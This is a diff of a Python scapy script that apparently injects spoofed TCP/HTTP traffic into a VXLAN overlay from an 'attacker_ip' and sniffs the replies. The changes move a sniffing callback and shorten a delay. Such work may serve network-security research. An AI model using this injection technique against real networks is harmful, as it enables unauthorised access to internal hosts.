@@ -45,15 +45,6 @@ URG = 0x20
 ECE = 0x40
 CWR = 0x80
 
-full_http_response = ""
-
-def get_http_packet(packet):
-        global http_answer 
-        http_answer = packet
-        global full_http_response
-        full_http_response += packet.getlayer(Raw).load
-        return
-
 
 def custom_action(packet):
     #print(packet.summary())
@@ -107,10 +98,14 @@ class myThread (threading.Thread):
       sniff_http_response_thread()
 
 
-def custom_action(packet):
-    global thepacket
-    thepacket = str(packet)
-    return
+### Sniff Funktion für sniff_http_response_thread
+full_http_response = ""
+def get_http_packet(packet):
+        global http_answer 
+        http_answer = packet
+        global full_http_response
+        full_http_response += packet.getlayer(Raw).load
+        return
 
 #Sniff HTTP Response Function
 def sniff_http_response_thread():
@@ -131,7 +126,7 @@ time.sleep(1)
 # send HTTP Request
 send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr)
 
-time.sleep(5)
+time.sleep(1)
 
 http_layer = http_answer.getlayer(http.HTTPResponse)
 ip_layer = http_answer.getlayer(IP)
